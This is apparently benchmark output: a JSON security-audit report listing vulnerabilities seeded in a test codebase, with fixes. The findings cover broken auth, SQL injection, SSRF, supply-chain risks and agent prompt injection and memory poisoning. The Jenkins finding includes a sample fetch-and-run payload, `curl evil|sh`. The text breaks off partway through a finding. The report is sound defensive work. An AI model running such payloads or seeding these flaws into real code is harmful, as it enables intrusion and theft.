@@ -1,0 +1,752 @@
+{
+  "provenance": {
+    "corpus": "/private/tmp/claude-501/-Users-cristianajavi/9d781ed3-bcf0-48ee-982b-aa1d8b6fbd34/scratchpad/round-eleven/ours",
+    "target": "/private/tmp/claude-501/-Users-cristianajavi/9d781ed3-bcf0-48ee-982b-aa1d8b6fbd34/scratchpad/round-eleven/target",
+    "arm": "ours",
+    "run": 3,
+    "directories_audited": [
+      "analytics-service",
+      "certs-authz",
+      "cli-packer",
+      "express-invoices",
+      "gateway-limits",
+      "intake-portal",
+      "node-supply",
+      "pipelines-migration",
+      "rag-agent",
+      "terraform-platform",
+      "wire-decoder"
+    ],
+    "method_note": "Unaided pass performed first on every file; then log_escaper.py enumeration (5 log sinks, 4 uncleared) and grep enumeration of exec/SQL/fetch/auth sinks and route boundaries; then knowledge packs (web-api, ai-safety, infra-cloud, supply-chain, local-app, privacy-abuse) consulted for procedure IDs and triage rules. Every reported finding was already in the unaided candidate list; the packs added IDs and confirmed classes, none were removed on second reading. 'Done-right' counterparts intentionally present in the tree (fetchAsset, customerName, /payments, /receipts/:id, verify_internal_token, run_tool_scoped, build_prompt_marked, ingest_ticket_marked, remember_preference, summarize_and_render, unpack_safely, stage_privately, write_token_privately, fetch-schema.js, .npmrc @acme scoping, release.yml, deployer IAM policy, public_alb 443, readText/readFrame bounds, customer_response_public, log_request_redacted, load_trackers_after_consent, summarize_account_pseudonymous) were ruled out per FP-01/FP-02/FP-05 and are the correct sibling of each finding."
+  },
+  "findings": [
+    {
+      "title": "JWT accepted without signature verification (jwt.decode instead of jwt.verify)",
+      "location": {
+        "path": "express-invoices/lib/auth.js",
+        "symbol": "currentUser",
+        "line": 6
+      },
+      "class": "Broken authentication (WEB-01)",
+      "severity": "high",
+      "evidence": "currentUser() and tagRequest() both call jwt.decode(bearer) on the Authorization bearer token. jwt.decode() parses the token WITHOUT verifying its signature; role/sub/tenant are taken from unverified claims. No jwt.verify(..., secret) appears anywhere.",
+      "impact": "Any client can forge a token with arbitrary sub and role='admin' (unsigned or signed with any key) and be treated as that principal. Full authentication bypass and privilege escalation; also undermines the owner_id filters on other routes that rely on req.user.id.",
+      "recommendation": "Replace jwt.decode with jwt.verify(token, key, {algorithms:['RS256'|'HS256'], audience, issuer}); reject on failure. Never derive identity or role from an unverified token.",
+      "status": "confirmed"
+    },
+    {
+      "title": "BOLA/IDOR: invoice detail returned without an ownership check",
+      "location": {
+        "path": "express-invoices/routes/invoices.js",
+        "symbol": "GET /invoices/:id",
+        "line": 8
+      },
+      "class": "Broken object-level authorization (WEB-04)",
+      "severity": "high",
+      "evidence": "GET /invoices/:id runs SELECT * FROM invoices WHERE id = $1 with only req.params.id and no owner scoping. The sibling GET /receipts/:id (line 15) queries '... WHERE id = $1 AND owner_id = $2' with req.user.id, showing the intended pattern is present but omitted here.",
+      "impact": "Any caller can read any other tenant's invoice by iterating ids. Cross-tenant data disclosure.",
+      "recommendation": "Add AND owner_id = $2 with the authenticated user id (or row-level security), matching the /receipts handler.",
+      "status": "confirmed"
+    },
+    {
+      "title": "SQL injection via ORDER BY clause built from request query",
+      "location": {
+        "path": "express-invoices/routes/invoices.js",
+        "symbol": "GET /invoices",
+        "line": 24
+      },
+      "class": "SQL injection (WEB-07)",
+      "severity": "high",
+      "evidence": "`SELECT * FROM invoices WHERE owner_id = $1 ORDER BY ${order}` where order = req.query.order || 'created_at'. The column name is interpolated raw (parameters cannot bind an identifier). The sibling GET /payments (line 32) uses a SORTABLE allowlist map, the safe pattern, which this route does not.",
+      "impact": "Attacker controls the ORDER BY expression; subqueries/CASE/(SELECT ...) enable boolean/time-based extraction of arbitrary data. SQL injection.",
+      "recommendation": "Resolve the sort to a fixed allowlist of column names (as /payments already does); never interpolate request input into SQL text.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Full-read SSRF: server fetches an arbitrary customer-supplied URL",
+      "location": {
+        "path": "express-invoices/lib/remote.js",
+        "symbol": "fetchLogo",
+        "line": 6
+      },
+      "class": "SSRF (WEB-10)",
+      "severity": "high",
+      "evidence": "fetchLogo(url) does fetch(url, {redirect:'follow'}) with no scheme/host allowlist and follows redirects; POST /branding/preview (routes/invoices.js:38) passes req.body.logoUrl into it and returns the fetched bytes to the client. The sibling fetchAsset() (line 11) validates parsed.hostname against an ALLOWED set and uses redirect:'error' \u2014 the control that fetchLogo lacks.",
+      "impact": "Attacker points logoUrl at http://169.254.169.254/ (cloud metadata), internal services, or file/gopher-reachable endpoints; response body is echoed back, so it is a read-SSRF exfiltrating internal data. Redirect-follow defeats naive host checks.",
+      "recommendation": "Validate scheme+host against an allowlist before fetch, resolve+pin the IP and block link-local/private ranges, and set redirect:'error' as fetchAsset does.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Stored XSS: customer note interpolated into HTML unescaped",
+      "location": {
+        "path": "express-invoices/lib/render.js",
+        "symbol": "invoiceNote",
+        "line": 5
+      },
+      "class": "Cross-site scripting (WEB-13)",
+      "severity": "medium",
+      "evidence": "invoiceNote(note) returns `<div class=\"note\">${note}</div>` with no encoding, on a value documented as 'free-text note the customer typed'. The sibling customerName() (line 10) wraps its input in escapeHtml(), the escape-html dependency is imported, and footer() coerces with Number() \u2014 invoiceNote is the one sink that skips encoding.",
+      "impact": "Attacker-typed note containing <script>/<img onerror> executes in the invoice viewer's browser (stored XSS) when the invoice is rendered.",
+      "recommendation": "Wrap note in escapeHtml() like customerName, or render via a template engine with contextual auto-escaping.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Missing function-level authorization on certificate upload",
+      "location": {
+        "path": "certs-authz/api/resources.py",
+        "symbol": "CertificatesUpload.post",
+        "line": 25
+      },
+      "class": "Broken function-level authorization (WEB-05 / WEB-24)",
+      "severity": "high",
+      "evidence": "CertificatesUpload.post returns service.upload(**data) with no permission check. Its sibling CertificatesList.post (line 18) builds AuthorityPermission(data['authority'].id, current_user().roles) and returns 403 when can() is false; CertificatesStats.post repeats that guard. Upload is the one write path where the authority check was dropped.",
+      "impact": "Any authenticated user can upload/issue a certificate against any certificate authority they are not authorized for (the classic Lemur missing-authorization pattern). Trust/issuance integrity compromise.",
+      "recommendation": "Apply the same AuthorityPermission(data['authority'].id, current_user().roles).can() gate on the upload path before service.upload.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Authorization checked on the created object, not on referenced objects; append silences victim cert",
+      "location": {
+        "path": "certs-authz/api/schemas.py",
+        "symbol": "CertificateInputSchema.resolve",
+        "line": 15
+      },
+      "class": "Broken object-level authorization via body references (WEB-25)",
+      "severity": "high",
+      "evidence": "resolve() sets data['supersedes'] = [service.get_certificate(i) for i in supersedes] \u2014 arbitrary certificate ids fetched with NO ownership filter, unlike the adjacent tags line which filters to current_user().tags. models.py on_supersedes_append (lines 16-19) reacts to appending each superseded cert by setting value.notify=False and value.superseded=True.",
+      "impact": "A user creates a certificate naming victims' certificate ids in 'supersedes'; the event listener marks those unrelated certificates superseded and mutes their renewal notifications. Cross-owner integrity/DoS on certificate lifecycle (expiry surprise) without ever authorizing the referenced objects.",
+      "recommendation": "Resolve supersedes only to certificates the caller owns/controls (mirror the tags filter), and enforce authorization on every object referenced in the body, not just the one in the path.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Signature verification is a no-op: verify_partner_signature always returns True",
+      "location": {
+        "path": "intake-portal/app/security.py",
+        "symbol": "verify_partner_signature",
+        "line": 10
+      },
+      "class": "Control that runs but cannot fail (WEB-27)",
+      "severity": "high",
+      "evidence": "verify_partner_signature computes `expected` (HMAC-SHA256) but never compares it to `signature`; it only checks `if not signature: return False` then `return True`. The sibling verify_internal_token (line 21) correctly returns hmac.compare_digest(expected, signature). Any non-empty signature string passes.",
+      "impact": "Partner webhook authentication is bypassed with any arbitrary non-empty X-Signature; attackers can forge webhook bodies and drive whatever state the intake accepts. Full webhook-auth bypass.",
+      "recommendation": "return hmac.compare_digest(expected, signature) \u2014 as verify_internal_token already does \u2014 using the raw request bytes and a constant-time compare.",
+      "status": "confirmed"
+    },
+    {
+      "title": "BOLA: export retrievable by id with no ownership check (authorizer returns True)",
+      "location": {
+        "path": "intake-portal/app/routes_exports.py",
+        "symbol": "_caller_may_export",
+        "line": 10
+      },
+      "class": "Broken object-level authorization (WEB-04 / PRV-05)",
+      "severity": "high",
+      "evidence": "_caller_may_export returns True whenever record is not None; get_export then returns the record. The sibling module routes_admin.py._caller_may_edit (line 13) shows the intended check `record['owner_id'] == caller_id`, which this authorizer omits.",
+      "impact": "Any caller can fetch any export (likely bulk PII) by guessing/enumerating record ids. Cross-tenant data disclosure.",
+      "recommendation": "Compare record ownership to the authenticated caller, as _caller_may_edit does.",
+      "status": "confirmed"
+    },
+    {
+      "title": "BOLA: form retrievable by id with no ownership check (authorizer returns True)",
+      "location": {
+        "path": "intake-portal/app/routes_forms.py",
+        "symbol": "_caller_may_read",
+        "line": 10
+      },
+      "class": "Broken object-level authorization (WEB-04 / PRV-05)",
+      "severity": "high",
+      "evidence": "_caller_may_read returns True whenever record is not None; get_form returns the record. routes_admin._caller_may_edit (line 13) is the intended owner_id comparison that this omits.",
+      "impact": "Any caller can read any submitted form by id. Cross-tenant disclosure of submitted intake data.",
+      "recommendation": "Enforce record ownership against the caller before returning the record.",
+      "status": "confirmed"
+    },
+    {
+      "title": "BOLA: partner record retrievable by id with no ownership check (authorizer returns True)",
+      "location": {
+        "path": "intake-portal/app/routes_partners.py",
+        "symbol": "_caller_may_view",
+        "line": 10
+      },
+      "class": "Broken object-level authorization (WEB-04 / PRV-05)",
+      "severity": "high",
+      "evidence": "_caller_may_view returns True whenever record is not None; get_partner returns the record. routes_admin._caller_may_edit (line 13) shows the omitted owner check.",
+      "impact": "Any caller can read any partner record by id. Cross-tenant disclosure.",
+      "recommendation": "Enforce record ownership against the caller before returning the record.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Identity taken from an unauthenticated client header (X-Caller)",
+      "location": {
+        "path": "intake-portal/app/routes_admin.py",
+        "symbol": "get_note",
+        "line": 19
+      },
+      "class": "Broken authentication / spoofable identity (WEB-01 / WEB-04)",
+      "severity": "medium",
+      "evidence": "Across all four route modules the 'caller_id' is request.headers.get('X-Caller'). Even the correct owner check in _caller_may_edit compares record['owner_id'] to this client-supplied header, which anyone can set to the victim's owner_id.",
+      "impact": "The ownership check in routes_admin (and any future check) is defeated by simply sending X-Caller: <owner_id>. Authorization based on a forgeable header.",
+      "recommendation": "Derive the caller identity from an authenticated, integrity-protected session/token verified server-side, never from a raw request header.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Retention purge never fires: expired() compares created_at to itself",
+      "location": {
+        "path": "intake-portal/app/store.py",
+        "symbol": "expired",
+        "line": 17
+      },
+      "class": "Retention control that deletes nothing (PRV-04)",
+      "severity": "medium",
+      "evidence": "expired() returns `isoparse(created_at) + timedelta(days=RETENTION_DAYS) < isoparse(created_at)`, i.e. created_at+90d < created_at, which is always False. The comparison should be against the current time, not created_at.",
+      "impact": "No record is ever considered expired, so the RETENTION_DAYS policy is inert and personal data is kept indefinitely \u2014 a privacy/compliance failure and growing breach blast-radius.",
+      "recommendation": "Compare against now(): return isoparse(created_at) + timedelta(days=RETENTION_DAYS) < datetime.now(timezone.utc).",
+      "status": "confirmed"
+    },
+    {
+      "title": "Insecure default secrets used when environment is unset",
+      "location": {
+        "path": "intake-portal/app/settings.py",
+        "symbol": "SESSION_SECRET",
+        "line": 6
+      },
+      "class": "Weak/hardcoded secret defaults (WEB-19)",
+      "severity": "medium",
+      "evidence": "SESSION_SECRET defaults to 'change-me-in-production' and PARTNER_SIGNING_KEY (security.py:7) defaults to 'local-development-key'. docker-compose.yml sets neither, so the container runs on these predictable values.",
+      "impact": "If the env vars are not set in an environment (compose shows they are not), sessions and the partner HMAC use publicly known keys, enabling session forgery and webhook signature forgery.",
+      "recommendation": "Fail fast when the secret is unset in non-dev environments (no usable default); load from a secrets manager. Never ship a working fallback secret.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Log injection: audit trail lines built from unescaped attacker data",
+      "location": {
+        "path": "intake-portal/app/audit.py",
+        "symbol": "record_rejection",
+        "line": 14
+      },
+      "class": "Log injection / forging (WEB-28)",
+      "severity": "low",
+      "evidence": "record_rejection logs 'submission ' + form_id + ' rejected: ' + reason (raw concatenation) and record_submission (line 10) logs with deferred %s; neither neutralises newlines. log_escaper.py flags both as UNCLEARED, while record_export (line 18, json.dumps) is cleared. form_id/reason/submitter originate from submission input.",
+      "impact": "CRLF in form_id/reason lets an attacker inject or split forged audit lines, hiding real events or fabricating them in the audit trail.",
+      "recommendation": "Encode the values before logging (json.dumps as record_export does, or strip/escape CR/LF); treat the audit log as attacker-influenced.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Dependency-confusion risk: internal-looking token-minting package from public index",
+      "location": {
+        "path": "intake-portal/requirements.txt",
+        "symbol": "svc-token-helpers",
+        "line": 5
+      },
+      "class": "Dependency confusion (SUP-05)",
+      "severity": "medium",
+      "evidence": "requirements.txt pins svc-token-helpers==1.0.0 with no index-url/hash pinning; tokens.py imports make_bearer from svc_token_helpers to mint partner bearer tokens. The name pattern is that of an internal helper; unlike node-supply's @acme scope (mitigated by .npmrc), nothing here reserves the name.",
+      "impact": "If the name is unclaimed on PyPI (or a higher version is published there), an attacker's package is installed and executes in-process while minting auth tokens \u2014 code execution and token forgery.",
+      "recommendation": "Install internal packages only from the private index (pinned --index-url / hashes), and reserve/placeholder-hold the name on the public index.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Cursor MCP server auto-installed unpinned with the signing key in its env",
+      "location": {
+        "path": "intake-portal/.cursor/mcp.json",
+        "symbol": "intake-helpers",
+        "line": 5
+      },
+      "class": "Repo config that runs on open; unpinned MCP (AI-29 / AI-09)",
+      "severity": "medium",
+      "evidence": "The committed .cursor/mcp.json launches `npx -y intake-mcp-helpers@latest` (unscoped, floating 'latest', auto-install) and passes PARTNER_SIGNING_KEY into its environment. Opening the repo in Cursor runs it.",
+      "impact": "A malicious or hijacked 'intake-mcp-helpers' (or any newer 'latest') executes on a developer's machine with the partner signing key in its environment \u2014 key theft and local RCE via a config that runs on open.",
+      "recommendation": "Pin the exact version and integrity, use a scoped/internal package, and do not expose real secrets to editor-launched MCP servers.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Container serves via the Flask dev server on 0.0.0.0 and runs as root",
+      "location": {
+        "path": "intake-portal/Dockerfile",
+        "symbol": "CMD flask run",
+        "line": 7
+      },
+      "class": "Container/runtime hardening (INF-07)",
+      "severity": "low",
+      "evidence": "CMD runs `flask ... run --host 0.0.0.0 --port 8000` (the Werkzeug dev server, not a production WSGI server) with no USER directive, so the process runs as root; base image python:3.12-slim is tag-pinned, not digest-pinned.",
+      "impact": "Dev server lacks production hardening (no worker isolation, weak DoS resistance); root process widens the impact of any RCE; mutable base tag weakens supply-chain integrity.",
+      "recommendation": "Serve with gunicorn/uvicorn, add a non-root USER, and pin the base image by digest.",
+      "status": "confirmed"
+    },
+    {
+      "title": "PII (including national_id) and raw notes sent to the LLM provider",
+      "location": {
+        "path": "analytics-service/app/assistant.py",
+        "symbol": "summarize_account",
+        "line": 9
+      },
+      "class": "PII in model prompts (PRV-07)",
+      "severity": "medium",
+      "evidence": "summarize_account builds a prompt embedding customer['full_name'], ['email'], ['national_id'] and the raw events list. The sibling summarize_account_pseudonymous (line 21) replaces the identity with a reversible token and strips the 'note' field from each event \u2014 the minimization this one skips.",
+      "impact": "Direct identifiers (national ID, email, name) and free-text notes leave the boundary to a third-party model/provider logs without a lawful-basis/minimization step; also exposes the prompt to indirect injection via attacker-controlled note text.",
+      "recommendation": "Use the pseudonymous path: tokenize identifiers and drop free-text notes before sending; document processor basis and retention.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Customer-facing serializer dumps internal fields (risk score, support notes, national_id)",
+      "location": {
+        "path": "analytics-service/app/serializers.py",
+        "symbol": "customer_response",
+        "line": 16
+      },
+      "class": "Over-exposure in API responses (PRV-02 / WEB-06)",
+      "severity": "medium",
+      "evidence": "customer_response returns asdict(customer), serializing every dataclass field including internal_risk_score, support_notes and national_id, for 'the customer-facing dashboard'. The sibling customer_response_public (line 24) restricts output to PUBLIC_FIELDS = (id, email, full_name).",
+      "impact": "Internal-only attributes (risk scoring, support notes) and a sensitive identifier are exposed to the customer; adding a new sensitive field silently leaks too.",
+      "recommendation": "Serialize via an explicit allowlist (customer_response_public) for external responses; never asdict() the full model to clients.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Personal data (email, national_id) written to application logs",
+      "location": {
+        "path": "analytics-service/app/logging_setup.py",
+        "symbol": "log_request",
+        "line": 9
+      },
+      "class": "PII in logs (PRV-09)",
+      "severity": "medium",
+      "evidence": "log_request logs 'email=%s national_id=%s' with user['email'] and user['national_id']. The sibling log_request_redacted (line 15) logs only user['id']. A RedactingFormatter exists but its regex only matches key=value for three literal keys and its attachment to the handler is not shown in-tree (control presence UNKNOWN, cannot be relied on per FP-08).",
+      "impact": "If the RedactingFormatter is not wired (or the PII appears in any other shape, e.g. the assistant prompt), direct identifiers land in log sinks/APM, expanding breach and access scope.",
+      "recommendation": "Log opaque ids only (log_request_redacted); if a redactor is used, verify it is attached to every handler and cover all PII shapes, not just three key=value tokens.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Third-party trackers loaded without consent",
+      "location": {
+        "path": "analytics-service/jobs/lifecycle.py",
+        "symbol": "load_trackers",
+        "line": 20
+      },
+      "class": "Telemetry without lawful basis (PRV-06)",
+      "severity": "low",
+      "evidence": "load_trackers unconditionally returns analytics and ads tracker <script> tags. The sibling load_trackers_after_consent (line 28) returns [] unless consent['analytics'] and drops the ads tag \u2014 the consent gate this one lacks.",
+      "impact": "Analytics/advertising trackers fire before/without consent, an ePrivacy/GDPR consent violation and unnecessary data sharing with third parties.",
+      "recommendation": "Gate all non-essential tags behind explicit per-category consent (load_trackers_after_consent).",
+      "status": "confirmed"
+    },
+    {
+      "title": "Model output executed as a shell command (subprocess shell=True)",
+      "location": {
+        "path": "rag-agent/agent/answer.py",
+        "symbol": "summarize_and_run",
+        "line": 46
+      },
+      "class": "Model output reaching an executable sink (AI-15 / WEB-08)",
+      "severity": "high",
+      "evidence": "summarize_and_run does subprocess.run(model_output, shell=True, ...) on text produced by the LLM. The sibling summarize_and_render (line 51) instead validates model_output['op'] against a closed {total,count,average} set. Model output is influenced by retrieved docs and the customer question.",
+      "impact": "Indirect prompt injection (a poisoned ticket/doc) or a crafted question makes the model emit a shell string that runs on the host \u2014 arbitrary command execution / RCE.",
+      "recommendation": "Never pass model output to a shell. Constrain to a closed operation set (summarize_and_render) or a fixed argv with no shell.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Agent tool grants model-chosen account and refund amount without scoping or approval",
+      "location": {
+        "path": "rag-agent/agent/answer.py",
+        "symbol": "run_tool",
+        "line": 27
+      },
+      "class": "Tool authorization decided by model text; missing human gate (AI-05 / AI-07)",
+      "severity": "high",
+      "evidence": "run_tool executes issue_refund(decision['account_id'], decision['amount']) straight from the model's decision \u2014 the model picks both target account and amount, no caller scoping, no confirmation. The sibling run_tool_scoped (line 36) forces account_id = session['authenticated_account_id'] and refuses refunds entirely.",
+      "impact": "Prompt injection or model error triggers refunds to arbitrary accounts for arbitrary amounts (financial loss / confused deputy). This is the external-action leg of a lethal-trifecta agent.",
+      "recommendation": "Bind sensitive tools to the authenticated session's own resources (run_tool_scoped), cap/allowlist amounts, and require human confirmation for money movement.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Retrieved documents interpolated into the prompt without delimitation or provenance",
+      "location": {
+        "path": "rag-agent/agent/answer.py",
+        "symbol": "build_prompt",
+        "line": 11
+      },
+      "class": "Indirect prompt injection (AI-02)",
+      "severity": "medium",
+      "evidence": "build_prompt concatenates SYSTEM + joined docs + question into one plain string with no separation between trusted instructions and retrieved content. The sibling build_prompt_marked (line 16) wraps each doc in <document source=.. trust=..> blocks and isolates the <question>.",
+      "impact": "A malicious retrieved doc's embedded instructions are read as system guidance, steering the model (and, combined with run_tool, its actions). Indirect prompt injection.",
+      "recommendation": "Use the marked form: delimit and label retrieved content as untrusted, keep instructions out of the data channel, and degrade privilege after ingesting external text.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Persistent memory written from raw model output (memory poisoning)",
+      "location": {
+        "path": "rag-agent/agent/memory.py",
+        "symbol": "remember_from_reply",
+        "line": 10
+      },
+      "class": "Writes to persistent memory from untrusted content (AI-13)",
+      "severity": "medium",
+      "evidence": "remember_from_reply appends the model's reply verbatim into a persistent notes list with no schema/validation. The sibling remember_preference (line 17) enforces a closed ALLOWED_KEYS schema with a TTL.",
+      "impact": "Injected/hallucinated content persists across sessions and is re-read later, creating durable prompt-injection and data-integrity contamination of the agent's memory.",
+      "recommendation": "Persist only closed-schema, validated fields with TTL (remember_preference); never store free-form model output as long-lived memory.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Untrusted customer ticket indexed into retrieval without trust marking",
+      "location": {
+        "path": "rag-agent/agent/memory.py",
+        "symbol": "ingest_ticket",
+        "line": 26
+      },
+      "class": "Ingestion path with no origin control (AI-12)",
+      "severity": "low",
+      "evidence": "ingest_ticket adds ticket['body'] to the index with no metadata. The sibling ingest_ticket_marked (line 31) attaches origin='customer-ticket', trust='untrusted' 'which retrieval filters on'.",
+      "impact": "Customer-supplied ticket text enters the RAG corpus unlabelled, so retrieval cannot down-weight/segregate it, feeding indirect prompt injection into build_prompt.",
+      "recommendation": "Tag every ingested item with origin/trust (ingest_ticket_marked) and have retrieval and prompt assembly respect the trust level.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Hardcoded live API key in MCP configuration",
+      "location": {
+        "path": "rag-agent/config/mcp.json",
+        "symbol": "billing.env.BILLING_API_KEY",
+        "line": 6
+      },
+      "class": "Secret in MCP config / working tree (AI-11 / SUP-16)",
+      "severity": "high",
+      "evidence": "The billing MCP server hardcodes BILLING_API_KEY = 'sk-acme-1f4d8e2b9c7a6d5e4f3b2a1c0d9e8f7a'. The sibling docs server uses env interpolation ${DOCS_TOKEN} instead.",
+      "impact": "A real billing credential is committed in cleartext; anyone with repo/history access obtains it and can call the billing API. Credential compromise.",
+      "recommendation": "Remove and rotate the key; inject via ${ENV} like the docs server; scan history and revoke.",
+      "status": "confirmed"
+    },
+    {
+      "title": "MCP server auto-run at floating 'latest' with no provenance pinning",
+      "location": {
+        "path": "rag-agent/config/mcp.json",
+        "symbol": "billing",
+        "line": 3
+      },
+      "class": "Unpinned MCP server (AI-09 / SUP-09)",
+      "severity": "medium",
+      "evidence": "billing runs `npx -y @acme/billing-mcp@latest`, auto-installing whatever 'latest' resolves to at run time, with the billing key in env.",
+      "impact": "A compromised/hijacked publish of the package executes with the billing credential \u2014 supply-chain rug-pull into the agent host.",
+      "recommendation": "Pin an exact version + integrity hash and vet updates before adopting them.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Lethal-trifecta agent: private data + untrusted input + external action in one loop",
+      "location": {
+        "path": "rag-agent/agent/answer.py",
+        "symbol": "run_tool / build_prompt / summarize_and_run",
+        "line": 27
+      },
+      "class": "Trifecta capability composition (AI-01)",
+      "severity": "high",
+      "evidence": "The same assistant reads private billing data (billing MCP, lookup/issue_refund), ingests untrusted content (customer tickets via memory.ingest_ticket, retrieved docs via build_prompt) and can act externally (issue_refund in run_tool; summarize_and_run shells out). All three legs co-exist without a privilege boundary between them.",
+      "impact": "Untrusted retrieved/ticket content can drive privileged actions on private data (refunds, command execution) \u2014 the composition that turns each individual weakness above into end-to-end compromise.",
+      "recommendation": "Break the trifecta: isolate untrusted-content handling from privileged tools, scope tools to the caller, drop privilege after ingestion, and require confirmation for external effects.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Typosquatted dependency 'lodahs' (of lodash)",
+      "location": {
+        "path": "node-supply/package.json",
+        "symbol": "dependencies.lodahs",
+        "line": 16
+      },
+      "class": "Typosquatting (SUP-07)",
+      "severity": "high",
+      "evidence": "dependencies include \"lodahs\": \"1.0.1\", a character transposition of the ubiquitous 'lodash'. 'lodahs' is a known malicious typosquat rather than a real utility.",
+      "impact": "Installing pulls attacker-controlled code that runs in the build/runtime (often via install scripts) \u2014 credential theft / RCE on developer and CI machines.",
+      "recommendation": "Remove lodahs; use lodash (or none); add an install-time typosquat/allowlist check to CI.",
+      "status": "confirmed"
+    },
+    {
+      "title": "preinstall script downloads and executes an unverified binary",
+      "location": {
+        "path": "node-supply/scripts/fetch-native.js",
+        "symbol": "main",
+        "line": 17
+      },
+      "class": "Install-time code execution / unverified fetch (SUP-03 / SUP-04)",
+      "severity": "high",
+      "evidence": "package.json 'preinstall' runs scripts/fetch-native.js, which https.get()s .../latest/billing-native, writes it to /usr/local/bin/billing-native and chmod +x \u2014 no checksum/signature check, floating 'latest'. The sibling fetch-schema.js (line 5,18) pins a SHA-256 and refuses to build on mismatch, the integrity check this one omits.",
+      "impact": "Any npm install (dev or CI) fetches and installs an executable with no integrity verification; a MITM or compromised host yields arbitrary native code execution as the install user.",
+      "recommendation": "Pin and verify a SHA-256 (as fetch-schema does) or use a signed release with signature verification; avoid lifecycle download-and-exec entirely.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Live secret token committed in runtime.json",
+      "location": {
+        "path": "node-supply/config/runtime.json",
+        "symbol": "reporting.token",
+        "line": 5
+      },
+      "class": "Secret in the working tree (SUP-16)",
+      "severity": "high",
+      "evidence": "runtime.json contains \"token\": \"acme_live_7f3b91d4c2e845a6b0d9f1e2c3a4b5d6\" \u2014 an 'acme_live_' prefixed credential in a checked-in config file (contrast .env.example which uses obvious placeholders).",
+      "impact": "A production reporting credential is exposed to anyone with repo/history access; enables authenticated calls to reports.acme.example.",
+      "recommendation": "Remove and rotate; load from env/secret store; add secret scanning to pre-commit and CI.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Jenkins interpolates attacker-controlled CHANGE_TITLE into a shell step",
+      "location": {
+        "path": "pipelines-migration/Jenkinsfile",
+        "symbol": "stage('Announce')",
+        "line": 12
+      },
+      "class": "SCM metadata injected into a shell step (INF-20)",
+      "severity": "high",
+      "evidence": "sh \"echo 'Building change: ${env.CHANGE_TITLE}' >> build/announce.log\" \u2014 Groovy expands the change/PR title directly into the sh command. The adjacent line 13 uses single-quoted sh with a shell var ($CHANGE_BRANCH_SAFE), the safe form this line avoids. The Build stage later holds npm-publish-token (line 19).",
+      "impact": "A PR/change title like `';curl evil|sh;'` executes on the build agent; because the same pipeline exposes the npm publish token and the agent workspace is reused, this yields RCE and publish-token theft.",
+      "recommendation": "Pass untrusted metadata via an environment variable referenced in single-quoted sh (as line 13 does); never interpolate ${env.CHANGE_TITLE} into a sh string.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Shared CI runner is privileged and mounts the host Docker socket",
+      "location": {
+        "path": "pipelines-migration/ci/runner-config.toml",
+        "symbol": "runners.docker (shared-docker-01)",
+        "line": 10
+      },
+      "class": "Privileged/shared runner (INF-09 / INF-23)",
+      "severity": "high",
+      "evidence": "shared-docker-01 sets privileged = true and volumes = ['/var/run/docker.sock:/var/run/docker.sock', '/cache']. The sibling release-ephemeral-01 is privileged=false, access_level=ref_protected, MaxBuilds=1 \u2014 the hardened counterpart.",
+      "impact": "Any job (including untrusted/fork jobs landing on this shared runner) can talk to the host Docker daemon or use privileged mode to escape the container and take over the runner host and its cached credentials.",
+      "recommendation": "Remove privileged and the docker.sock mount; use rootless/ephemeral, ref-protected runners for untrusted work (as release-ephemeral-01).",
+      "status": "confirmed"
+    },
+    {
+      "title": "Non-protected staging deploy token reachable from fork merge-request pipelines",
+      "location": {
+        "path": "pipelines-migration/.gitlab-ci.yml",
+        "symbol": "integration",
+        "line": 28
+      },
+      "class": "Secret reachable from an outside contributor's pipeline (INF-19 / INF-21)",
+      "severity": "high",
+      "evidence": "The integration job runs on `$CI_PIPELINE_SOURCE == 'merge_request_event'` and uses $STAGING_DEPLOY_TOKEN in a curl. The settings export (docs/ci-settings-export.md) records merge-request pipelines enabled 'for all contributors, including forks' and STAGING_DEPLOY_TOKEN as Protected:no (masked only), scope '*' \u2014 contrast PRODUCTION_DEPLOY_TOKEN which is Protected:yes/production.",
+      "impact": "A fork's malicious MR runs the job and can exfiltrate/misuse the staging deploy token (masking hides logs, not use). Attacker gains staging deploy capability. This is established from in-tree config plus the provided settings export (FP-08 evidence present).",
+      "recommendation": "Mark STAGING_DEPLOY_TOKEN protected and scope it to a protected environment; do not run secret-bearing jobs on fork MR pipelines (guard with a protected-branch/pipeline-source condition).",
+      "status": "confirmed"
+    },
+    {
+      "title": "CI imports a build template from a movable, group-writable ref",
+      "location": {
+        "path": "pipelines-migration/.gitlab-ci.yml",
+        "symbol": "include(platform/ci-templates@main)",
+        "line": 5
+      },
+      "class": "Pipeline dependency from a pointer that can move (INF-22 / SUP-09)",
+      "severity": "medium",
+      "evidence": "include pulls /jobs/build.yml from platform/ci-templates at ref: main (mutable), while the second include (sast.yml, line 8) pins ref: 8f14e45...a2b7 (a SHA). The settings export notes 'the whole engineering group has push access to [ci-templates] default branch'.",
+      "impact": "Any engineer (or a compromised account) can push to ci-templates@main and inject code into the billing build, which runs with the pipeline's credentials. Supply-chain-in-CI.",
+      "recommendation": "Pin template includes to an immutable commit SHA (as the sast include already does) and restrict who can move it.",
+      "status": "confirmed"
+    },
+    {
+      "title": "Bastion security group exposes SSH (port 22) to 0.0.0.0/0",
+      "location": {
+        "path": "terraform-platform/modules/network/main.tf",
+        "symbol": "aws_security_group.admin",
+        "line": 6
+      },
+      "class": "Network rule open to the internet (INF-04)",
+      "severity": "high",
